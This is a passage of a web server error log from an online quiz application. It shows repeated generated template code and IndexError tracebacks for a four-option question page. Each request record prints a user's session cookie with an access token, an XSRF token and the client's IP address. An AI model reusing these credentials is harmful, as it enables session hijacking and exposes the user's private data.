 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c3c478e4c854802b2dbcc&answers=%5B2%5D&cursor=7&_xsrf=4080daf3104b4e8e8e3ca92ab5b023a8', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '94.169.91.254', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFBUTNKSHE0dWxRWkFrSlJDWVVvR0R5N2hpaUZudzlManJuZ1VNMVpCNkx1ZWsxbFFPUkZqSDhzZk1aQUlQcE5HME1idVJyYU1wcXFQWkJFUk91b3dhUXJ1M1JwMFFaRFpE|1348222018|d905cb71fa9c3b36d4dcb2cbc1904734ab972dc3; _xsrf=4080daf3104b4e8e8e3ca92ab5b023a8; __utmz=188782963.1348083281.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmc=188782963; __utmb=188782963.3.10.1348222001; __utma=188782963.747762148.1348083281.1348083281.1348222001.2', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 82.58ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c3c478e4c854802b2dbcc&answers=%5B1%5D&cursor=12&_xsrf=4080daf3104b4e8e8e3ca92ab5b023a8', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '94.169.91.254', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFBUTNKSHE0dWxRWkFrSlJDWVVvR0R5N2hpaUZudzlManJuZ1VNMVpCNkx1ZWsxbFFPUkZqSDhzZk1aQUlQcE5HME1idVJyYU1wcXFQWkJFUk91b3dhUXJ1M1JwMFFaRFpE|1348222018|d905cb71fa9c3b36d4dcb2cbc1904734ab972dc3; _xsrf=4080daf3104b4e8e8e3ca92ab5b023a8; __utmz=188782963.1348083281.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmc=188782963; __utmb=188782963.3.10.1348222001; __utma=188782963.747762148.1348083281.1348083281.1348222001.2', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 84.49ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
